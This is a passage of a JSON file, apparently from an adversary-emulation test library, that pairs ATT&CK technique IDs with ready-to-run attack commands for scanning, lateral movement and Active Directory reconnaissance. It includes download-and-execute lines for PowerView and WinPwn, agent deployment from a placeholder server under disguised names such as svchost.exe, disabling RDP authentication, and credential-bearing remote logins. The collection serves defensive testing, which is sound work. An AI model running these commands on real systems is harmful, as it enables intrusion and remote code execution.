{
   "T1254": {
      "technique_name": "Conduct active scanning",
      "tactic": "technical-information-gathering",
      "known implementations": [
         {
            "description": "Scan an external host for open ports and services",
            "command": "./scanner.sh #{target.ip}\n"
         }
      ]
   },
   "T1349": {
      "technique_name": "Build or acquire exploits",
      "tactic": "build-capabilities",
      "known implementations": [
         {
            "description": "Load Metasploit Abilities",
            "command": "msfconsole -r msf_extract.rb #{app.contact.http} #{app.api_key.red}\n"
         }
      ]
   },
   "T1021.001": {
      "technique_name": "Remote Services: Remote Desktop Protocol",
      "tactic": "lateral-movement",
      "known implementations": [
         {
            "description": "Changing RDP Port to Non Standard Port via Command_Prompt\n",
            "command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber /t REG_DWORD /d 4489 /f && netsh advfirewall firewall add rule name=\"RDPPORTLatest-TCP-In\" dir=in action=allow protocol=TCP localport=4489"
         },
         {
            "description": "Changing RDP Port to Non Standard Port via Powershell\n",
            "command": "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -name \"PortNumber\" -Value 4489; New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4489"
         },
         {
            "description": "Attempt an RDP session via Remote Desktop Application to a DomainController.\n",
            "command": "if((Get-CIMInstance -Class Win32_ComputerSystem) { ; } else {Write-Host Joining this computer to a domain must be done manually};  ;  $Server=#{logonserver}; $User = Join-Path; $Password=\"#{password}\"; cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password; mstsc /v:$Server; echo \"RDP connection established\""
         },
         {
            "description": "Disables network-level authentication (NLA) for RDP by changing a registry key via Command Prompt\nDisabling NLA for RDP can allow remote user interaction with the Windows sign-in screen prior to authentication. According to Microsoft, Flax Typhoon actors used this technique implementation to achieve persistence on victim systems: https://www.microsoft.com/en-us/security/blog/2023/08/24/flax-typhoon-using-legitimate-software-to-quietly-access-taiwanese-organizations/\nSee also: https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/management/enable_rdp.py\n",
            "command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /d 0 /t REG_DWORD /f"
         }
      ]
   },
   "T1021.002": {
      "technique_name": "Remote Services: SMB/Windows Admin Shares",
      "tactic": "lateral-movement",
      "known implementations": [
         {
            "description": "Connecting To Remote Shares\n",
            "command": "cmd.exe /c \"net use \\\\Target\\C$ P@ssw0rd1 /u:DOMAIN\\Administrator\""
         },
         {
            "description": "Map Admin share utilizing PowerShell\n",
            "command": "New-PSDrive -name g -psprovider filesystem -root \\\\Target\\C$"
         },
         {
            "description": "Copies a file to a remote host and executes it using PsExec. Requires the download of PsExec from [https://docs.microsoft.com/en-us/sysinternals/downloads/psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" \\\\localhost -accepteula -c C:\\Windows\\System32\\cmd.exe"
         },
         {
            "description": "Executes a command, writing the output to a local Admin Share.\nThis technique is used by post-exploitation frameworks.\n",
            "command": "cmd.exe /Q /c hostname 1> \\\\127.0.0.1\\ADMIN$\\output.txt 2>&1"
         },
         {
            "description": "Mounts a network file share on a target computer",
            "command": "net use \\\\#{remote.host.ip}\\c$ /user:#{domain.user.name} #{domain.user.password};\n"
         },
         {
            "description": "Mount a windows share",
            "command": "net use \\\\#{remote.host.fqdn}\\C$ /user:#{domain.user.name} #{domain.user.password}\n"
         },
         {
            "description": "Copy 54ndc47 to remote host (SMB)",
            "command": "$path = \"sandcat.go-windows\";\n$drive = \"\\\\#{remote.host.fqdn}\\C$\";\nCopy-Item -v -Path $path -Destination $drive\"\\Users\\Public\\s4ndc4t.exe\";\n"
         }
      ]
   },
   "T1021.006": {
      "technique_name": "Remote Services: Windows Remote Management",
      "tactic": "lateral-movement",
      "known implementations": [
         {
            "description": "Powershell Enable WinRM\n\nUpon successful execution, powershell will \"Enable-PSRemoting\" allowing for remote PS access.\n",
            "command": "Enable-PSRemoting -Force"
         },
         {
            "description": "An adversary may attempt to use Evil-WinRM with a valid account to interact with remote systems that have WinRM enabled",
            "command": "evil-winrm -i Target -u Domain\\Administrator -p P@ssw0rd1"
         },
         {
            "description": "Simulate lateral movement with PowerShell Remoting on the local host. \nUpon successful execution, PowerShell will execute `whoami` using `Invoke-Command`, targeting the \nlocal machine as remote target.\n",
            "command": "Enable-PSRemoting -Force; Invoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami}"
         },
         {
            "description": "Start Agent using WinRM (WinRM)",
            "command": "$username = \"#{domain.user.name}\";\n$password = \"#{domain.user.password}\";\n$secstr = New-Object -TypeName System.Security.SecureString;\n$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n$session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;\nInvoke-Command -Session $session -ScriptBlock{start-job -scriptblock{cmd.exe /c start C:\\Users\\Public\\svchost.exe -server #{server} }};\nStart-Sleep -s 5;\nRemove-PSSession -Session $session;\n"
         },
         {
            "description": "Copy Sandcat file using PowerShell",
            "command": "$server=\"#{server}\";\n$sharePath=\"#{share}\";\nSet-Location $sharePath;$url=\"$($server)/file/download\";\n$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"sandcat.go\");($data=$wc.DownloadData($url)) -and\n($name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\"))\n-and ([io.file]::WriteAllBytes(\"$($sharePath)$name.exe\",$data));\n$startServer=\"$($sharePath)$name.exe -server $($server) \";Invoke-Command\n-ScriptBlock {Param([string]$startServer, $sharePath, $name, $server)  Invoke-WmiMethod\n-Class Win32_Process -Name Create -ArgumentList \"$($sharePath)$name.exe\n-server $server -v\" } -ComputerName #{remote.host.name} -ArgumentList $startServer, $sharePath, $name, $server\n"
         }
      ]
   },
   "T1570": {
      "technique_name": "Lateral Tool Transfer",
      "tactic": "lateral-movement",
      "known implementations": [
         {
            "description": "Simulates an attacker exfiltrating data over SMB over QUIC using the New-SmbMapping command.\nPrerequisites:\n  - A file server running Windows Server 2022 Datacenter: Azure Edition\n  - A Windows 11 computer\n  - Windows Admin Center\n",
            "command": "New-SmbMapping -RemotePath '\\\\example.com\\sales' -TransportType QUIC -SkipCertificateCheck; copy 'C:\\path\\to\\file.txt' 'Z:\\'"
         },
         {
            "description": "Simulates an attacker exfiltrating data over SMB over QUIC using the NET USE command.\nPrerequisites:\n  - A file server running Windows Server 2022 Datacenter: Azure Edition\n  - A Windows 11 computer\n  - Windows Admin Center\n",
            "command": "NET USE * '\\\\example.com\\sales' /TRANSPORT:QUIC /SKIPCERTCHECK; copy 'C:\\path\\to\\file.txt' '*:\\'"
         },
         {
            "description": "Uses CertUtil as a LoL technique to move the .exe agent as a certificate using windows-signed binaries",
            "command": "certutil -encode #{location} C:\\users\\public\\com.crt | out-null;\ninvoke-command #{remote.host.fqdn} -scriptblock { certutil -decode \\\\#{local.host.fqdn}\\c$\\users\\public\\com.crt #{location}; invoke-wmimethod -computername . -class win32_process -name Create -argumentlist \"C:\\users\\public\\splunkd.exe -server #{server} -group red\" }\n"
         },
         {
            "description": "Copy 54ndc47 to remote host (powershell 5 or newer only) or SCP",
            "command": "$job = Start-Job -ScriptBlock {\n  $username = \"#{domain.user.name}\";\n  $password = \"#{domain.user.password}\";\n  $secstr = New-Object -TypeName System.Security.SecureString;\n  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n  $session = New-PSSession -ComputerName \"#{remote.host.name}\" -Credential $cred;\n  $location = \"#{location}\";\n  $exe = \"#{exe_name}\";\n  Copy-Item $location -Destination \"C:\\Users\\Public\\svchost.exe\" -ToSession $session;\n  Start-Sleep -s 5;\n  Remove-PSSession -Session $session;\n};\nReceive-Job -Job $job -Wait;\n"
         },
         {
            "description": "Copy Sandcat file using PsExec on CMD",
            "command": "net /y use \\\\#{remote.host.name} & copy /y sandcat.go-windows\n\\\\#{remote.host.name}\\Users\\Public & #{psexec.path} -accepteula \\\\#{remote.host.name}\ncmd /c start C:\\Users\\Public\\sandcat.go-windows -server #{server} -v\n"
         }
      ]
   },
   "T1021.005": {
      "technique_name": "Remote Services:VNC",
      "tactic": "lateral-movement",
      "known implementations": [
         {
            "description": "ARD leverages a blend of protocols, including VNC to send the screen and control buffers and SSH for secure file transfer. \nAdversaries can abuse ARD to gain remote code execution and perform lateral movement.\n\nReferences:  https://www.mandiant.com/resources/blog/leveraging-apple-remote-desktop-for-good-and-evil\n",
            "command": "sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -allowAccessFor -allUsers -privs -all -quiet"
         }
      ]
   },
   "T1021.003": {
      "technique_name": "Remote Services: Distributed Component Object Model",
      "tactic": "lateral-movement",
      "known implementations": [
         {
            "description": "Powershell lateral movement using the mmc20 application com object.\n\nReference:\n\nhttps://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/\n\nUpon successful execution, cmd will spawn calc.exe on a remote computer.\n",
            "command": "[activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.application\",\"localhost\")).Document.ActiveView.ExecuteShellCommand(\"c:\\windows\\system32\\calc.exe\", $null, $null, \"7\")"
         }
      ]
   },
   "T1012": {
      "technique_name": "Query Registry",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "Query Windows Registry.\nUpon successful execution, cmd.exe will perform multiple reg queries. Some will succeed and others will fail (dependent upon OS).\nReferences:\nhttps://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order\nhttps://blog.cylance.com/windows-registry-persistence-part-1-introduction-attack-phases-and-windows-services\nhttp://www.handgrep.se/repository/cheatsheets/postexploitation/WindowsPost-Exploitation.pdf\nhttps://www.offensive-security.com/wp-content/uploads/2015/04/wp.Registry_Quick_Find_Chart.en_us.pdf\n",
            "command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" && reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce && reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce && reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices && reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices && reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\" && reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\" && reg query \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\" && reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\" && reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad && reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce && reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx && reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run && reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run && reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce && reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run && reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run && reg query HKLM\\system\\currentcontrolset\\services /s | findstr ImagePath 2>nul | findstr /Ri \".*\\.sys$\" && reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run && reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot && reg query \"HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\" && reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\\Startup\""
         },
         {
            "description": "Query Windows Registry with Powershell cmdlets, i.e., Get-Item and Get-ChildItem. The results from above can also be achieved with Get-Item and Get-ChildItem.\nUnlike using \"reg query\" which then executes reg.exe, using cmdlets won't generate new processes, which may evade detection systems monitoring process generation. \n",
            "command": "Get-Item -Path \"HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\"; Get-ChildItem -Path \"HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\\" | findstr Windows; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\"; Get-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\"; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\"; Get-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\"; Get-Item -Path \"HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\"; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\"; Get-Item -Path \"HKCU:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"; Get-Item -Path \"HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad\"; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\"; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Run\"; Get-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\"; Get-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"; Get-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"; Get-ChildItem -Path \"HKLM:system\\currentcontrolset\\services\" ; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Run\"; Get-Item -Path \"HKLM:SYSTEM\\CurrentControlSet\\Control\\SafeBoot\"; Get-ChildItem -Path \"HKLM:SOFTWARE\\Microsoft\\Active Setup\\Installed Components\"; Get-ChildItem -Path \"HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\\Startup\""
         },
         {
            "description": "This test is designed to enumerate the COM objects listed in HKCR, then output their methods and CLSIDs to a text file.\nAn adversary could then use this information to identify COM objects that might be vulnerable to abuse, such as using them to spawn arbitrary processes. \nSee: https://www.mandiant.com/resources/hunting-com-objects",
            "command": "New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR; Get-ChildItem -Path HKCR:\\CLSID -Name | Select -Skip 1 > $env:temp\\clsids.txt; ForEach($CLSID in Get-Content \"$env:temp\\clsids.txt\"); {try{write-output \"$($Position)-$($CLSID)\"; write-output \"------------\"| out-file $env:temp\\T1592.002Test1.txt -append; write-output $($CLSID)| out-file $env:temp\\T1592.002Test1.txt -append; $handle=[activator]::CreateInstance([type]::GetTypeFromCLSID($CLSID)); $handle | get-member -erroraction silentlycontinue | out-file $env:temp\\T1592.002Test1.txt -append; $position += 1} catch{}}"
         },
         {
            "description": "Query Registry using PowerShell Get-ItemProperty",
            "command": "Get-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\n"
         }
      ]
   },
   "T1087.002": {
      "technique_name": "Account Discovery: Domain Account",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "Utilizing PowerView, run Get-DomainUser to identify the domain users. Upon execution, Users within the domain will be listed.\n",
            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -verbose"
         },
         {
            "description": "Enumerate all accounts via PowerShell. Upon execution, lots of user account and group information will be displayed.\n",
            "command": "net user /domain; get-localgroupmember -group Users; get-aduser -filter *"
         },
         {
            "description": "Enumerate logged on users. Upon exeuction, logged on users will be displayed.\n",
            "command": "query user /SERVER:%COMPUTERNAME%"
         },
         {
            "description": "This test will enumerate the details of the built-in domain admin account\n",
            "command": "net user administrator /domain"
         },
         {
            "description": "The following Atomic test will utilize ADSISearcher to enumerate root domain unit within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81\n",
            "command": "(([adsisearcher]'').SearchRooT).Path | %{if(([ADSI]\"$_\").gPlink){Write-Host \"[+] Domain Path:\"([ADSI]\"$_\").Path;$a=((([ADSI]\"$_\").gplink) -replace \"[[;]\" -split \"]\");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host \"Policy Path[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host \"Policy Name[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output \"`n\" }}"
         },
         {
            "description": "ADRecon extracts and combines information about an AD environement into a report. Upon execution, an Excel file with all of the data will be generated and its\npath will be displayed.\n",
            "command": "Invoke-Expression \"C:\\Users\\puma-4\\Desktop\\ADRecon.ps1\""
         },
         {
            "description": "Output information from LDAPSearch. LDAP Password is the admin-user password on Active Directory\n",
            "command": "ldapsearch -H ldap://example.test:389 -x -D user@example.test -w s3CurePssw0rD! -b \"CN=Users,DC=example,DC=test\" -s sub -a always -z 1000 dn"
         },
         {
            "description": "Attackers may attempt to query for computer objects with the UserAccountControl property\n'TRUSTED_FOR_DELEGATION' (0x80000;524288) set\nMore Information - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#when-the-stars-align-unconstrained-delegation-leads-to-rce\nPrerequisite: AD RSAT PowerShell module is needed and it must run under a domain user\n",
            "command": "Try {;     Import-Module ActiveDirectory -ErrorAction Stop | Out-Null;      ; }; Catch {;     if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {;   Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online; } else {;   Install-WindowsFeature RSAT-AD-PowerShell; }; };  ;  Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=524288)' -Server $env:UserDnsDomain"
         },
         {
            "description": "The following Atomic test will utilize ADSISearcher to enumerate users within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n",
            "command": "([adsisearcher]\"objectcategory=user\").FindAll(); ([adsisearcher]\"objectcategory=user\").FindOne()"
         },
         {
            "description": "The following Atomic test will utilize ADSISearcher to enumerate organizational unit within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81\n",
            "command": "(([adsisearcher]'(objectcategory=organizationalunit)').FindAll()).Path | %{if(([ADSI]\"$_\").gPlink){Write-Host \"[+] OU Path:\"([ADSI]\"$_\").Path;$a=((([ADSI]\"$_\").gplink) -replace \"[[;]\" -split \"]\");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host \"Policy Path[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host \"Policy Name[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output \"`n\" }}"
         },
         {
            "description": "This test discovers users who have authenticated against a Domain Controller via NTLM. \nThis is done remotely via wmic and captures the event code 4776 from the domain controller and stores the ouput in C:\\temp. [Reference](https://www.reliaquest.com/blog/socgholish-fakeupdates/)\n",
            "command": "$target = $env:LOGONSERVER; $target = $target.Trim(\"\\\\\"); $IpAddress = [System.Net.Dns]::GetHostAddresses($target) | select IPAddressToString -ExpandProperty IPAddressToString; wmic.exe /node:$IpAddress process call create 'wevtutil epl Security C:\\\\ntlmusers.evtx /q:\\\"Event[System[(EventID=4776)]]\"'"
         },
         {
            "description": "Gathers general domain information using the generaldomaininfo function of WinPwn",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); generaldomaininfo -noninteractive -consoleoutput"
         },
         {
            "description": "Adfind tool can be used for reconnaissance in an Active directory environment. The example chosen illustrates adfind used to query the local password policy.\nreference- http://www.joeware.net/freetools/tools/adfind/, https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties"
         },
         {
            "description": "Enumerates active directory usernames using the userenum function of Kerbrute",
            "command": "C:\\Users\\puma-4\\Desktop\\kerbrute_windows_386.exe userenum -d $env:USERDOMAIN --dc $env:UserDnsDomain \"C:\\Users\\puma-4\\Desktop\\username.txt\""
         },
         {
            "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Exchange Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -sc exchaddresses"
         },
         {
            "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Admin accounts\nreference- http://www.joeware.net/freetools/tools/adfind/, https://stealthbits.com/blog/fun-with-active-directorys-admincount-attribute/\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -sc admincountdmp"
         },
         {
            "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory User Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=person)"
         },
         {
            "description": "Enumerate all accounts\nUpon exection, multiple enumeration commands will be run and their output displayed in the PowerShell session\n",
            "command": "net user /domain && net group /domain"
         },
         {
            "description": "The net utility is executed via cmd to enumerate domain user accounts.",
            "command": "net user /domain"
         },
         {
            "description": "The net utility is executed via cmd to enumerate detailed information about a specific user account.",
            "command": "net user #{domain.user.name} /domain"
         }
      ]
   },
   "T1016": {
      "technique_name": "System Network Configuration Discovery",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "A list of commands known to be performed by Qakbot for recon purposes",
            "command": "\"64c4ae_qakbot.bat\""
         },
         {
            "description": "This is to test for what ports are open outbound.  The technique used was taken from the following blog:\nhttps://www.blackhillsinfosec.com/poking-holes-in-the-firewall-egress-testing-with-allports-exposed/\n\nUpon successful execution, powershell will read top-128.txt (ports) and contact each port to confirm if open or not. Output will be to Desktop\\open-ports.txt.\n",
            "command": "$ports = Get-content \"88a14d_top-128.txt\"; $file = \"$env:USERPROFILE\\Desktop\\open-ports.txt\"; $totalopen = 0; $totalports = 0; New-Item $file -Force; foreach ($port in $ports) {;     $test = new-object system.Net.Sockets.TcpClient;     $wait = $test.beginConnect(\"allports.exposed\", $port, $null, $null);     $wait.asyncwaithandle.waitone(250, $false) | Out-Null;     $totalports++ | Out-Null;     if ($test.Connected) {;         $result = \"$port open\" ;         Write-Host -ForegroundColor Green $result;         $result | Out-File -Encoding ASCII -append $file;         $totalopen++ | Out-Null;     };     else {;         $result = \"$port closed\" ;         Write-Host -ForegroundColor Red $result;         $totalclosed++ | Out-Null;         $result | Out-File -Encoding ASCII -append $file;     }; }; $results = \"There were a total of $totalopen open ports out of $totalports ports tested.\"; $results | Out-File -Encoding ASCII -append $file; Write-Host $results"
         },
         {
            "description": "\"This will test if the macOS firewall is enabled and/or show what rules are configured. Must be run with elevated privileges. Upon successful execution, these commands will output various information about the firewall configuration, including status and specific port/protocol blocks or allows. \n\nUsing `defaults`, additional arguments can be added to see filtered details, such as `globalstate` for global configuration (\\\"Is it on or off?\\\"), `firewall` for common application allow rules, and `explicitauths` for specific rules configured by the user. \n\nUsing `socketfilterfw`, flags such as --getglobalstate or --listapps can be used for similar filtering. At least one flag is required to send parseable output to standard out. \n",
            "command": "sudo defaults read /Library/Preferences/com.apple.alf; sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate"
         },
         {
            "description": "Identify network configuration information\n\nUpon successful execution, cmd.exe will spawn multiple commands to list network configuration settings. Output will be via stdout.\n",
            "command": "ipconfig /all && netsh interface show interface && arp -a && nbtstat -n && net config"
         },
         {
            "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Subnet Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=subnet)"
         },
         {
            "description": "Identify network configuration information.\n\nUpon successful execution, sh will spawn multiple commands and output will be via stdout.\n",
            "command": "if [ -x \"$(command -v arp)\" ]; then : ; else (which yum && yum -y install net-tools)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y net-tools); fi;  ;  if [ -x \"$(command -v arp)\" ]; then arp -a; else echo \"arp is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v ifconfig)\" ]; then ifconfig; else echo \"ifconfig is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v ip)\" ]; then ip addr; else echo \"ip is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v netstat)\" ]; then netstat -ant | awk '{print $NF}' | grep -v '[a-z]' | sort | uniq -c; else echo \"netstat is missing from the machine. skipping...\"; fi; "
         },
         {
            "description": "Enumerates Windows Firewall Rules using netsh.\n\nUpon successful execution, cmd.exe will spawn netsh.exe to list firewall rules. Output will be via stdout.\n",
            "command": "netsh advfirewall firewall show rule name=all"
         },
         {
            "description": "Identify System domain dns controller on an endpoint using nslookup ldap query. This tool is being abused by qakbot malware to gather information on the domain\ncontroller of the targeted or compromised host. reference https://securelist.com/qakbot-technical-analysis/103931/\n",
            "command": "nslookup -querytype=ALL -timeout=12 _ldap._tcp.dc._msdcs.%USERDNSDOMAIN%"
         },
         {
            "description": "Identify network configuration information as seen by Trickbot and described here https://www.sneakymonkey.net/2019/10/29/trickbot-analysis-part-ii/\n\nUpon successful execution, cmd.exe will spawn `ipconfig /all`, `net config workstation`, `net view /all /domain`, `nltest /domain_trusts`. Output will be via stdout.\n",
            "command": "ipconfig /all && net config workstation && net view /all /domain && nltest /domain_trusts"
         },
         {
            "description": "Capture the local network broadcast IP address",
            "command": "ifconfig | grep broadcast"
         },
         {
            "description": "View all potential WIFI networks on host",
            "command": "./#{payload:9f639067-370a-40ba-b7ac-6f1c15d5a158} scan\n"
         },
         {
            "description": "Find Domain information",
            "command": "nbtstat -n\n"
         },
         {
            "description": "Ping a remote host to see if it is accessible",
            "command": "ping #{remote.host.fqdn}\n"
         },
         {
            "description": "Ping the network in order to build the ARP cache",
            "command": "for ip in $(seq 190 199); do ping -c 1 $(echo #{domain.broadcast.ip} |\ncut -d. -f-3).$ip -W 1; done\n"
         },
         {
            "description": "See the most used WIFI networks of a machine",
            "command": "./wifi.sh pref\n"
         },
         {
            "description": "View network configuration info for host",
            "command": "sudo ifconfig\n"
         }
      ]
   },
   "T1482": {
      "technique_name": "Domain Trust Discovery",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "Utilizing PowerView, run Get-ForestTrust to identify forest trusts. Upon execution, progress and info about forest trusts within the domain being scanned will be displayed.\n",
            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-ForestTrust -Verbose"
         },
         {
            "description": "Uses the nltest command to discover domain trusts.\nRequires the installation of nltest via Windows RSAT or the Windows Server AD DS role.\nThis technique has been used by the Trickbot malware family.\n",
            "command": "nltest /domain_trusts && nltest /trusted_domains"
         },
         {
            "description": "Use powershell to enumerate AD information.\nRequires the installation of PowerShell AD admin cmdlets via Windows RSAT or the Windows Server AD DS role.\n",
            "command": "Import-Module \"C:\\Users\\puma-4\\Desktop\\PowerView.ps1\"; Get-NetDomainTrust; Get-NetForestTrust; Get-ADDomain; Get-ADGroupMember Administrators -Recursive; ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()"
         },
         {
